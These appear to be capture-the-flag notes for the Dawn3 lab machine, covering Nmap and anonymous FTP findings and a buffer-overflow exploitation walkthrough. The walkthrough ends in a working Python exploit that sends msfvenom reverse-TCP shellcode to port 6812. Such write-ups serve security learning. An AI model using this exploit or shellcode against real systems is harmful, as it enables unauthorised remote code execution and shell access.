# Export
```md
export IP="192.168.217.13"
export URL="http://192.168.217.13"
```

<hr>

# Loot
+ `dawn3.exe` found in the ftp server.
+ Vulnerable to BoF exploit → get `root` shell.

<hr>

# Nmap

```bash
2100/tcp open  ftp     syn-ack ttl 63 pyftpdlib 1.5.6
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwsrwxrwx   1 dawn3    dawn3      292728 Mar 08  2020 dawn3.exe [NSE: writeable]
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 192.168.217.13:2100
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
6812/tcp open  unknown syn-ack ttl 63
```

<hr>

# FTP

+ Anonymous allows: read and write

```md
ftp> ls
200 Active data connection established.
125 Data connection already open. Transfer starting.
-rwsrwxrwx   1 dawn3    dawn3      292728 Mar 08  2020 dawn3.exe
226 Transfer complete.
```

<hr>

# Exploitation
#### Buffer Overflow

+ Set working dir:

```md
!mona config -set workingfolder C:\Users\admin\Desktop
```

+ Pattern offset: `524`

```md
!mona findmsp -distance 600
```

+ Bad char: `\x00\x01`

```md
!mona bytearray -b "\x00"
!mona compare -f C:\Users\admin\Desktop\bytearray.bin -a <ESP_address>
```

+ Jump point: `52501513`

```md
!mona jmp -r esp -cpb "\x00\x01"
```

+ PoC:

```py
import socket

ip = "192.168.217.13"
port = 6812

offset = 524
overflow = "A" * offset
retn = "\x13\x15\x50\x52" # JMP ESP address 52501513
padding = "\x90"*16

# msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -b "\x00\x01" -f py
buf =  ""
buf += "\xda\xca\xb8\xd4\x32\x74\xf0\xd9\x74\x24\xf4\x5b\x33"
buf += "\xc9\xb1\x12\x31\x43\x17\x03\x43\x17\x83\x17\x36\x96"
buf += "\x05\xa6\xec\xa1\x05\x9b\x51\x1d\xa0\x19\xdf\x40\x84"
buf += "\x7b\x12\x02\x76\xda\x1c\x3c\xb4\x5c\x15\x3a\xbf\x34"
buf += "\x66\x14\x0e\x1d\x0e\x67\x71\x87\x53\xee\x90\x07\x0d"
buf += "\xa1\x03\x34\x61\x42\x2d\x5b\x48\xc5\x7f\xf3\x3d\xe9"
buf += "\x0c\x6b\xaa\xda\xdd\x09\x43\xac\xc1\x9f\xc0\x27\xe4"
buf += "\xaf\xec\xfa\x67"

postfix = "\x90\x90\x90\x90"

buffer = overflow + retn + padding + buf + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    s.connect((ip, port))
    print("Sending evil buffer...")
    s.send(bytes(buffer + "\r\n", "latin-1"))
    print("Done!")
except:
    print("Could not connect.")
```